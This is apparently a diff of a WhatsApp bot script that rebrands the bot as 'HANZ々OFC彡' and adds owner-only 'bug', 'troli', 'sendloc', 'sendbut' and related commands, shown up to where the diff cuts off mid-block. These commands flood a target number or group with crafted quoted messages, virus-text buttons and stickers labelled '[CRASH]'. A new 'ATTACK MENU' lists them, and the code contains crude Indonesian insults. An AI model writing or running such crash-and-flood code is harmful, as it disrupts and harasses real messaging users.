@@ -378,7 +378,7 @@ const shield2 = {
     "imageMessage": {
         "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
         "mimetype": "image/jpeg",
-        "caption": "BOT-SHIELD.ID",
+        "caption": "BOT-HANZ々OFC彡",
         "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
         "fileLength": "28777",
         "height": 1080,
@@ -2852,209 +2852,13 @@ let capt = `⭔ Title: ${judul}
                 }
             }
             break
-case 'bug': {
-if(!isCreator) return m.reply("Khusus Owner")
-try {
-if(text.endsWith("@g.us")) {
-    a = await hisoka.sendMessage(m.chat, {text: "Succes by Shield.id"})
-    c = fs.readFileSync('error.jpg')
-    b = await hisoka.sendMessage(m.chat, {react: {url: 'error.jpg', key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-     hisoka.sendImageAsSticker(text, c, b, {packname: 'shield.id', author: 'Kanvret'})
-     await sleep(50000)
-} else if(text.startsWith("@")) {
-    a = await hisoka.sendMessage(m.chat, {text: "Succes by Shield.id"})
-    b = await hisoka.sendMessage(m.chat, {react: {ur: "error.jpg", key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
-    c = fs.readFileSync('./error.jpg')
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-} else if(text.includes("+")) {
-    a = await hisoka.sendMessage(m.chat, {text: "Succes by Shield.id"})
-    b = await hisoka.sendMessage(m.chat, {react: {url: 'error.jpg', key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
-   c = fs.readFileSync('error.jpg')
-    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-    await sleep(50000)
-    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-} else if(isQuoted) {
-    a = await hisoka.sendMessage(m.chat, {text: "Succes by Shield.id"})
-    b = await hisoka.sendMessage(m.chat, {react: {url: 'error.jpg', key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
-    hisoka.sendMessage(quoted.sender, {text: " "}, {quoted: b})
-    hisoka.sendMessage(quoted.sender, {text: " "}, {quoted: b})
-    hisoka.sendMessage(quoted.sender, {text: " "}, {quoted: b})
-} else {
-        m.reply("Dibutuhkan id Room")
-        }
-} catch (e) {
-        m.reply("error")
-        }
-}
-break
-case 'troli': {
-    if(!isCreator) return m.reply("Khusus Owner")
-    let users1 = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-    c = fs.readFileSync('error.jpg')
-    for (let i = 0; i < 10; i++){
-     hisoka.sendMessage(`${text.split("+")[1]}@s.whatsapp.net`, {text: "pe"}, {quoted:troli})
-    await hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, troli, {packname: 'shield.id', author: 'Kanvret'})
-        await sleep(3000 * 60)
-    }
-}
-    break
-case 'bug1': {
-if(!isCreator) return m.reply("Khusus Owner")
-try {
-if(text.endsWith("@g.us")) {
-    a = await hisoka.sendMessage(m.chat, {text: "Succes by Shield.id"})
-    d = {key:{fromMe: false, participant: `0@s.whatsapp.net`}}
-    c = fs.readFileSync('error.jpg')
-    b = await hisoka.sendMessage(m.chat, {react: {url: 'error.jpg', key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
-    let pek = { 
-        key: { 
-            fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: "" }) 
-        }, 
-        message: { 
-            "imageMessage": { 
-                "mimetype": "image/jpeg", 
-                "caption": `kontol`, 
-                "jpegThumbnail": c
-            } 
-        } 
-    }
-    hisoka.sendMessage(text, {text: "pe"}, {quoted:pek})
-     hisoka.sendImageAsSticker(text, c, pek, {packname: 'shield.id', author: 'Kanvret'})
-} else if(text.startsWith("@")) {
-    a = await hisoka.sendMessage(m.chat, {text: "Succes by Shield.id"})
-    c = fs.readFileSync('./error.jpg')
-    pek = { 
-        key: { 
-            fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: "" }) 
-        }, 
-        message: { 
-            "imageMessage": { 
-                "mimetype": "image/jpeg", 
-                "caption": `pe`, 
-                "jpegThumbnail": c
-            } 
-        } 
-    }
-    hisoka.sendMessage(`${text.split("@")[1]}@s.whatsapp.net`, {text: "pe"}, {quoted:pek})
-    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'shield.id', author: 'kanvret'})
-} else if(text.includes("+")) {
-    a = await hisoka.sendMessage(m.chat, {text: "Succes by Shield.id"})
-   c = fs.readFileSync('error.jpg')
-   pek = { 
-        key: { 
-            fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: ""}) 
-        }, 
-        message: { 
-            "imageMessage": { 
-                "mimetype": "image/jpeg", 
-                "caption": `pe`, 
-                "jpegThumbnail": c
-            } 
-        } 
-    }
-    hisoka.sendMessage(`${text.split("+")[1]}@s.whatsapp.net`, {text: "pe"}, {quoted:pek})
-    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, pek, {packname: 'shield.id', author: 'kanvret'})
-} else if(isQuoted) {
-    a = await hisoka.sendMessage(m.chat, {text: "Succes by Shield.id"})
-    c = fs.readFileSync('error.jpg')
-     pek = { 
-        key: { 
-            fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: ""}) 
-        }, 
-        message: { 
-            "imageMessage": { 
-                "mimetype": "image/jpeg", 
-                "caption": `pe`, 
-                "jpegThumbnail": c
-            } 
-        } 
-    }
-    hisoka.sendMessage(quoted.sender, {text: "pe"}, {quoted:pek})
-    hisoka.sendImageAsSticker(quoted.sender, c, pek, {packname: 'shield.id', author: 'kanvret'})
-} else {
-        m.reply("Dibutuhkan id Room")
-        }
-} catch (e) {
-        m.reply("error")
-        }
-}
-break
-//SCRAPE BY KANVRET
+//SCRAPE BY I GIVE [CRASH]
 case 'getcase': {
 if (!isCreator) return reply(mess.owner)
 if (!args[0]) return reply("Mau ngambil case apa?")
 const turbrek = `break`
 try {
-m.reply(`// BY KANVRET\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./hisoka.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
+m.reply(`BY HANZ々OFC彡\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./hisoka.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
 } catch {
 m.reply("Case Tidak Ditemukan")
 }
@@ -3335,7 +3139,7 @@ let time1 = de.toLocaleDateString(locale, {hour: 'numeric', minute: 'numeric', s
 ⁙┃〲 *『 ᗰᗩIᑎ ᗰᗴᑎᑌ 』*
 ⁙┃〲◦➛${prefix}ᴘɪɴɢ
 ⁙┃〲◦➛${prefix}ᴏᴡɴᴇʀ
-⁙┃〲◦➛${prefix}ᴍᴇɴᴜ / ${ᴘʀᴇꜰɪx}ʜᴇʟᴘ / ${ᴘʀᴇꜰɪx}?
+⁙┃〲◦➛${prefix}ᴍᴇɴᴜ 
 ⁙┃〲◦➛${prefix}ᴅᴇʟᴇᴛᴇ
 ⁙┃〲◦➛${prefix}ɪɴꜰᴏᴄʜᴀᴛ
 ⁙┃〲◦➛${prefix}Qᴜᴏᴛᴇᴅ
@@ -3392,6 +3196,29 @@ let time1 = de.toLocaleDateString(locale, {hour: 'numeric', minute: 'numeric', s
 ⁙┃〲◦➛${prefix}ꜱᴇᴛᴘᴘʙᴏᴛ [ɪᴍᴀɢᴇ]
 ⁙┃〲◦➛${prefix}ꜱᴇᴛᴇxɪꜰ
 ⁙┃〲◦➛${prefix}ꜱᴇᴛᴍᴇɴᴜ [ᴏᴘᴛɪᴏɴ]
+⁙┃▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
+⁙┃〲 *『 ᗷᑌᘜ ᗰᗴᑎᑌ 』*
+⁙┃〲◦➛${prefix}ʙᴜɢᴠ1 [sᴀᴍᴘᴇ 11]
+⁙┃〲◦➛${prefix}ʙᴜɢʙᴜᴛᴛᴏɴ
+⁙┃〲◦➛${prefix}ʙᴜɢᴅᴏᴄ
+⁙┃〲◦➛${prefix}ᴛʀᴏʟɪ
+⁙┃〲◦➛${prefix}ʙᴜɢʟɪsᴛ
+⁙┃〲◦➛${prefix}ʙᴜɢʀᴇᴀᴄ
+⁙┃〲◦➛${prefix}
+⁙┃〲◦➛${prefix}
+⁙┃〲◦➛${prefix}
+⁙┃〲◦➛${prefix}
+⁙┃〲◦➛${prefix}
+⁙┃▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
+⁙┃〲 *『 ᗩTTᗩᑕK ᗰᗴᑎᑌ 』*
+⁙┃〲◦➛${prefix}sᴇɴᴅʀᴇᴀᴄ
+⁙┃〲◦➛${prefix}ʙᴜɢ [ᴛᴇxᴛ|ɪᴅ ɢᴄ] sᴛɪᴄᴋᴇʀ/ᴛᴇxᴛ ǫᴜᴏᴛᴇᴅ
+⁙┃〲◦➛${prefix}ʙᴜɢ [ᴛᴇxᴛ|ɪᴅ ᴘᴄ] sᴛɪᴄᴋᴇʀ/ᴛᴇxᴛ ǫᴜᴏᴛᴇᴅ
+⁙┃〲◦➛${prefix}ᴛʀᴏʟɪ [ɪᴅ ᴘᴄ] sᴛɪᴄᴋᴇʀ/ᴛᴇxᴛ ǫᴜᴏᴛᴇᴅ
+⁙┃〲◦➛${prefix}ᴛʀᴏʟɪ [ɪᴅ ɢᴄ] sᴛɪᴄᴋᴇʀ/ᴛᴇxᴛ ǫᴜᴏᴛᴇᴅ
+⁙┃〲◦➛${prefix}ʙᴜɢ1 [ɪᴅ ᴘᴄ] sᴛɪᴄᴋᴇʀ/ᴛᴇxᴛ ǫᴜᴏᴛᴇᴅ
+⁙┃〲◦➛${prefix}sᴇɴᴅʟᴏᴄ [ᴛᴇxᴛ|ɴᴏᴍᴇʀ] ᴛᴇxᴛ ǫᴜᴏᴛᴇᴅ ʟᴏᴄ
+⁙┃〲◦➛${prefix}sᴇɴᴅ [ɴᴏᴍᴇʀ] ʙᴜɢʙᴜᴛᴛᴏɴ
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭`
                 let btn = [{
                                 urlButton: {
@@ -3615,7 +3442,6 @@ message: { "contactMessage": {
  "jpegThumbnail": fs.readFileSync('./menu1.jpeg')}}}
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fkon})
 break      
-
 case 'bugbutton': {
 let buttons = [
 {buttonId: `Jembod`, buttonText:{displayText:`HANZ々OFC彡-${virtex1(prefix)}`,}, type: 1}
@@ -3640,7 +3466,38 @@ ${virtex1(prefix)}`,
                 hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'sendreaksi' : {
+case 'sendbut':
+                    if (!isCreator) throw mess.owner
+                    if (!text) throw `MANA NOMERNYA KONTOL`
+                 buttonspc = [
+                        {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: virtex1}, type: 1},
+                        {buttonId: 'babaabbabababa', buttonText: {displayText: virtex1}, type: 1},
+                        {buttonId: 'babababbababa', buttonText: {displayText: virtex1}, type: 1}
+                      ]
+                      
+                    buttonMessagepc = {
+                          text: "HANZ々OFC彡",
+                          footerText: 'Pe',
+                          buttons: buttonspc,
+                          headerType: 1
+                      }
+                      hisoka.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
+                      m.reply(`succes`)
+                    break            
+case 'buglist':
+if (!isCreator) throw mess.owner
+kontolputralist = [
+                {
+                title: `🔥 𝐓𝐁𝐂 - 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥 ${ranzmods} ${buttonvirus}`,
+                rows: [
+                {title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
+                {title: ranzmods, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
+                ]
+                }
+                ]
+                hisoka.sendListMsg(m.chat, `🔥 𝐓𝐁𝐂 - 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, hisoka.user.name, `Hay Ngentod`, `🔥 𝐓𝐁𝐂 - 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, kontolputralist, m)
+break                    
+case 'sendreac' : {
                 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
                 a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                 await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
@@ -3672,7 +3529,9 @@ m.reply(`SUCCES`)
                 await sleep(20)
             }
                 break
-case 'colidek' : {
+case 'bugreac' : 
+if(!isCreator) return m.reply("Khusus Owner") 
+{
                     a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                     await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
                     await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
@@ -3694,6 +3553,243 @@ case 'colidek' : {
                     m.reply(`BUG COLI DEK`)
                      }
                 break
+case 'sendloc':               
+         if(!isCreator) return m.reply("Khusus Owner")
+          if (!text) throw `MANA NOMERNYA KONTOL`
+             let hanz = {
+key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+liveLocationMessage: {
+caption: `By: メʜᴀɴᴢ ᴏꜰᴄメ`,
+jpegThumbnail: fs.readFileSync(`./menu1.jpeg`), 
+}
+}
+}
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"HANZ々OFC彡 [CRASH]"},{quoted:hanz})
+            m.reply(`SUCCES`)
+            break                
+case 'bug': {
+if(!isCreator) return m.reply("Khusus Owner")
+try {
+if(text.endsWith("@g.us")) {
+    a = await hisoka.sendMessage(m.chat, {text: "Succes"})
+    c = fs.readFileSync('error.jpg')
+    b = await hisoka.sendMessage(m.chat, {react: {url: 'error.jpg', key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+     hisoka.sendImageAsSticker(text, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+     await sleep(50000)
+} else if(text.startsWith("@")) {
+    a = await hisoka.sendMessage(m.chat, {text: "Succes Mengirim"})
+    b = await hisoka.sendMessage(m.chat, {react: {ur: "error.jpg", key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
+    c = fs.readFileSync('./error.jpg')
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+} else if(text.includes("+")) {
+    a = await hisoka.sendMessage(m.chat, {text: "Succes Mengirim"})
+    b = await hisoka.sendMessage(m.chat, {react: {url: 'error.jpg', key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
+   c = fs.readFileSync('error.jpg')
+    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+    await sleep(50000)
+    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+} else if(isQuoted) {
+    a = await hisoka.sendMessage(m.chat, {text: "Succes Mengirim"})
+    b = await hisoka.sendMessage(m.chat, {react: {url: 'error.jpg', key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
+    hisoka.sendMessage(quoted.sender, {text: " "}, {quoted: b})
+    hisoka.sendMessage(quoted.sender, {text: " "}, {quoted: b})
+    hisoka.sendMessage(quoted.sender, {text: " "}, {quoted: b})
+} else {
+        m.reply("Dibutuhkan id Room")
+        }
+} catch (e) {
+        m.reply("error")
+        }
+}
+break
+case 'troli': {
+    if(!isCreator) return m.reply("Khusus Owner")
+    let users1 = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+    c = fs.readFileSync('error.jpg')
+    for (let i = 0; i < 10; i++){
+     hisoka.sendMessage(`${text.split("+")[1]}@s.whatsapp.net`, {text: "HANZ々OFC彡I GIVE [CRASH]"}, {quoted:troli})
+    await hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, troli, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+        await sleep(3000 * 60)
+    }
+}
+    break
+case 'bug1': {
+if(!isCreator) return m.reply("Khusus Owner")
+try {
+if(text.endsWith("@g.us")) {
+    a = await hisoka.sendMessage(m.chat, {text: "Succes Mengirim"})
+    d = {key:{fromMe: false, participant: `0@s.whatsapp.net`}}
+    c = fs.readFileSync('error.jpg')
+    b = await hisoka.sendMessage(m.chat, {react: {url: 'error.jpg', key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
+    let pek = { 
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+            "imageMessage": { 
+                "mimetype": "image/jpeg", 
+                "caption": `kontol`, 
+                "jpegThumbnail": c
+            } 
+        } 
+    }
+    hisoka.sendMessage(text, {text: "HANZ々OFC彡I GIVE [CRASH]"}, {quoted:pek})
